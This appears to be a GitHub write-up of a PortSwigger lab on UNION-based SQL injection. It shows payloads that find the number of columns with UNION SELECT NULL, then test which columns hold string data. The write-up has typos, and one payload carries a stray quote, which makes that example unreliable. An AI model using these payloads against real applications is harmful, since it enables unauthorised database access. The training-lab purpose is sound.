## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5086ef31-864a-4e3f-a5b1-8f27bf57b35c)

## Solution :

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```
Added "UNION NULL" to the request to determine the number of columns used in the query.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL,NULL--
```
This did not throws an internal server error. It means that there are 3 columns that is being retreived in the query.

We need to use the UNION SELECT payload  using 3 NULL values. Try thetring value *JK9WNI* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

**JK9WNI in 1st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'JK9WNI',NULL,NULL --
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2b13d9b4-7e05-4e44-ad65-1f556f4bf6fb)

**JK9WNI in 2st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'JK9WNI',NULL --
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4d5b00b3-7095-497b-afd2-c88bfd379752)



